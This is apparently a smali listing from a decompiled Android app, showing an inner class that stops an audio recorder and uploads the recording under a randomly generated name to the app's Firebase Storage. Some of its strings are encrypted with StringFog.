.class Lsigma/male/MainActivity$24$1;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/MainActivity$24;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lsigma/male/MainActivity$24;


# direct methods
.method constructor <init>(Lsigma/male/MainActivity$24;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    .line 920
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lsigma/male/MainActivity$24$1;)Lsigma/male/MainActivity$24;
    .locals 1

    .prologue
    .line 920
    iget-object v0, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 6

    .prologue
    .line 924
    :try_start_0
    iget-object v0, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v0}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/MainActivity;->access$17(Lsigma/male/MainActivity;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 925
    iget-object v0, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v0}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/MainActivity;->access$17(Lsigma/male/MainActivity;)Landroid/media/MediaRecorder;

    move-result-object v0

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 926
    iget-object v0, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v0}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Lsigma/male/MainActivity;->access$18(Lsigma/male/MainActivity;Landroid/media/MediaRecorder;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 929
    :goto_0
    const-string v0, "NDYlSV0zMy5EUj44K0NXJSU0XkwgIjFVQS8="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 930
    const-string v1, "ZWV0HgxgYnEVAQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 931
    const/16 v2, 0x8

    .line 932
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 933
    new-instance v3, Ljava/util/Random;

    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    .line 934
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v2}, Ljava/lang/StringBuilder;-><init>(I)V

    .line 935
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v0

    add-int/lit8 v0, v0, -0x1

    invoke-virtual {v3, v0}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    invoke-virtual {v1, v0}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 937
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->length()I

    move-result v0

    :goto_1
    if-lt v0, v2, :cond_0

    .line 941
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 942
    iget-object v1, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v1}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/MainActivity;->access$19(Lsigma/male/MainActivity;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v1

    invoke-virtual {v1, v0}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v1

    new-instance v2, Ljava/io/File;

    iget-object v3, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v3}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v3

    invoke-virtual {v3}, Lsigma/male/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "eiYjThY4JHU="

    invoke-static {v4}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v1

    iget-object v2, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v2}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/MainActivity;->access$20(Lsigma/male/MainActivity;)Lcom/google/android/gms/tasks/OnFailureListener;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v1

    iget-object v2, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v2}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/MainActivity;->access$21(Lsigma/male/MainActivity;)Lcom/google/firebase/storage/OnProgressListener;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v1

    new-instance v2, Lsigma/male/MainActivity$24$1$1;

    invoke-direct {v2, p0, v0}, Lsigma/male/MainActivity$24$1$1;-><init>(Lsigma/male/MainActivity$24$1;Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 946
    iget-object v1, p0, Lsigma/male/MainActivity$24$1;->this$1:Lsigma/male/MainActivity$24;

    invoke-static {v1}, Lsigma/male/MainActivity$24;->access$0(Lsigma/male/MainActivity$24;)Lsigma/male/MainActivity;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/MainActivity;->access$22(Lsigma/male/MainActivity;)Lcom/google/android/gms/tasks/OnCompleteListener;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;

    .line 947
    return-void

    .line 938
    :cond_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v5

    invoke-virtual {v3, v5}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    invoke-virtual {v1, v5}, Ljava/lang/String;->charAt(I)C

    move-result v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    .line 937
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_0
.end method
